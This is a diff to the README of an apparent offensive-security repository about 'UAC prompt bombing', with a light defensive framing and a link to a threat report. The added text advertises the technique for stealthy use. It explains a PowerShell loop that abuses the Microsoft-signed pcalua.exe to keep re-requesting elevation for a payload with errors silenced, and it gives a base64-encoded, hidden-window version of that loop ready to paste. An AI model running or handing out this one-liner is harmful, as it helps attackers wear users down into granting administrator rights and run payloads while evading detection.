@@ -1,5 +1,18 @@
 # ⚡ UAC Prompt Bombing
 
+
+
+[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell)](https://microsoft.com/powershell)
+[![Windows](https://img.shields.io/badge/Windows-10%2B-red?logo=windows)](https://www.microsoft.com/windows)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Stars](https://img.shields.io/github/stars/yourusername/uac-buster?style=social)](https://github.com/yourusername/uac-buster)
+
+---
+
+> **🔥 Red Team Magic: Spam UAC prompts until admin rights are yours! 🔥**  
+> A stealthy, loop-based PowerShell one-liner that abuses `pcalua.exe` (Microsoft-signed LOLBin) to relentlessly request elevation and launch your payload. Perfect for pentesting demos, CTFs, or ethical hacking labs. **Use responsibly—educational purposes only!** ⚠️
+
+
 ---
 
 In August 2025, eSentire's Threat Response Unit (TRU) discovered 
@@ -9,7 +22,21 @@ Defender.
 
 [Read Full article](https://www.esentire.com/blog/new-botnet-emerges-from-the-shadows-nightshadec2)
 
+
 ---
+## 🎯 Why This Rocks
+- **Zero Dependencies** 🛠️: Pure PowerShell + built-in Windows binary.
+- **Infinite Retries** 🔄: Silent failures? No problem—loops forever until success.
+- **Stealth Mode** 🕶️: Errors suppressed, no console spam.
+- **LOLBin Abuse** 🛡️: `pcalua.exe` evades AV/EDR (signed by Microsoft).
+- **UAC Fatigue** 😈: Social engineering via prompt bombardment.
+- **One-Liner Wonder** ✨: Copy-paste ready for quick deployment.
+
+
+---
+
+> **MITRE ATT&CK**: T1548.002 (Abuse Elevation Control Mechanism) 🗡️
+
 
 ## 🎯 Purpose
 
@@ -19,6 +46,9 @@ We’ll focus on human factors, defensive detection, and mitigation through safe
 ---
 
 🧠 Goal: Help blue-teamers, sysadmins, and researchers understand the risks and develop better safeguards — ethically and responsibly.
+
+---
+
 
 ---
 
@@ -72,6 +102,20 @@ try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentL
 
 ---
 
+## 🔍 Breakdown (Tech Mode Activated 🤓)
+
+| Component | What It Does | 
+|-----------|--------------|
+| `try {throw ""}` | Forces a fake error to jump-start the loop. |
+| `while (-not $?)` | Retries endlessly if last command failed (`$?` = failure flag). | 
+| `Start-Process pcalua.exe -a <payload> -Verb RunAs` | Launches payload via trusted LOLBin with UAC elevation prompt. |
+| `catch {Write-Error "" -ErrorAction SilentlyContinue}` | Swallows errors silently—no traces! |
+
+
+
+
+---
+
 ### You can encode the whole thing.
 
 
@@ -83,4 +127,13 @@ try {throw ""} catch {while ( -not $? ){try {Start-Process pcalua.exe -ArgumentL
 ```powershell
 powershell -noni -w hidden -e dAByAHkAIAB7AHQAaAByAG8AdwAgACIAIgB9ACAAYwBhAHQAYwBoACAAewB3AGgAaQBsAGUAIAAoACAALQBuAG8AdAAgACQAPwAgACkAewB0AHIAeQAgAHsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAYwBhAGwAdQBhAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAGEAIABDADoAXABVAHMAZQByAHMAXAByAGUAZAB0AGUAYQBtAFwARABlAHMAawB0AG8AcABcAHIAZQB2AC0AbQBhAHIAawAyAC4AZQB4AGUAIgAgACAALQBWAGUAcgBiACAAUgB1AG4AQQBzAH0AIABjAGEAdABjAGgAIAB7AFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQB9AH0AfQAgAA==
 ```
+
+
+
+
+
+
+
+
+
 
